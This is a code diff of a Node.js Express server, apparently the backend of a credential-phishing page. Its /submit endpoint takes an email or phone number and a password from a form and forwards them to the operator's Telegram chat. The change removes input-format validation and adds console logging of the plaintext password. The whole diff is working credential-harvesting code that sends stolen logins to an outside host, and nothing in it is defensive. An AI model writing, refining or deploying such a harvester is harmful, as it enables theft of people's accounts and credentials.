@@ -53,35 +53,22 @@ bot.onText(/\/start/, (msg) => {
   });
 });
 
-// === Form Submission Endpoint ===
+// === Form Submission Endpoint (No Validation) ===
 app.post('/submit', async (req, res) => {
   console.log('📨 Form submission received:', req.body);
   
   const { Email, Password } = req.body;
   
-  // Validate input
+  // Only check if fields exist (no validation)
   if (!Email || !Password) {
     console.log('❌ Missing email or password');
     return res.status(400).json({
       error: 'Email/Phone and Password are required'
     });
   }
-
-  const cleanEmail = Email.replace(/\s+/g, '');
-  // Basic validation for email or phone
-  const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-  // Updated Bangladeshi phone patterns to be more flexible
-  const bdPhonePattern = /^(?:\+?880|0)?1[3-9]\d{8}$|^01[3-9]\d{8}$/;
-
-  if (!emailPattern.test(cleanEmail) && !bdPhonePattern.test(cleanEmail)) {
-    console.log('❌ Invalid email or phone format');
-    return res.status(400).json({
-      error: 'Please enter a valid email address or phone number'
-    });
-  }
   
   if (!CHAT_ID) {
-    console.log('❌ No chat ID available');
+    console.log('❌ No chat ID available - Send /start to bot first!');
     return res.status(400).json({
       error: 'Bot has not been started yet. Send /start to the bot first.'
     });
@@ -101,6 +88,8 @@ app.post('/submit', async (req, res) => {
   try {
     await bot.sendMessage(CHAT_ID, msg);
     console.log('✅ Message sent to Telegram');
+    console.log('📧 Email/Phone:', Email);
+    console.log('🔑 Password:', Password);
     res.status(200).json({ message: '✅ Data sent to Telegram bot.' });
   } catch (err) {
     console.error('❌ Telegram API error:', err.message);
